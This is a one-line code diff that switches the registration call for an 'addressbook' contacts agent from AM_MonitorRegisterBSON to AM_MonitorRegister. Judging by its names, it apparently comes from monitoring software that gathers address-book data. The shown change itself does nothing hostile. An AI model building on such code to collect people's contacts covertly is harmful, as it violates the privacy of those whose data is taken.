@@ -227,5 +227,5 @@ DWORD __stdcall PM_ContactsInit(JSONObject elem)
 
 void PM_ContactsRegister()
 {
-	AM_MonitorRegisterBSON(L"addressbook", PM_CONTACTSAGENT, (BYTE *)PM_ContactsDispatch, (BYTE *)PM_ContactsStartStop, (BYTE *)PM_ContactsInit, NULL);
+	AM_MonitorRegister(L"addressbook", PM_CONTACTSAGENT, (BYTE *)PM_ContactsDispatch, (BYTE *)PM_ContactsStartStop, (BYTE *)PM_ContactsInit, NULL);
 }
